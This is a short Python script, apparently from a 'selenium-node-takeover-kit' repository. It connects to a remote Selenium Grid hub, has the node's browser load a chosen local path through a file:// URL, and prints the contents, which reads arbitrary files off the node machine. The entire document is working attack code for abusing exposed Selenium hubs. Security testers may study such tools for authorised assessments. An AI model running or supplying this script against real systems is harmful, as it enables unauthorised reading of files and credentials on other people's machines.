#!/usr/bin/env python3
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_cat.py
# 
# A quick and light version of selenium_node_download.py that doesnt handle binary files.
# Simply creates a connection and loads the remote file with the browser.

import sys, getopt
from selenium import webdriver

hub_url, remote_file, browser = None, None, 'firefox'
myopts, args = getopt.getopt(sys.argv[1:],':h:r:b:')
for o, a in myopts:
    if o == '-h':
        hub_url = a
    elif o == '-r':
        remote_file = a
    elif o == '-b':
        browser = a

# Nothing special about the driver here. Probably would work on any browser
driver = webdriver.Remote(
   command_executor=hub_url,
   desired_capabilities={'browserName': browser}
   )

# Just get the local file and print it.
try:
    driver.get('file://%s' % (remote_file))
    print(driver.page_source)
finally:
    driver.quit()

sys.exit(0)
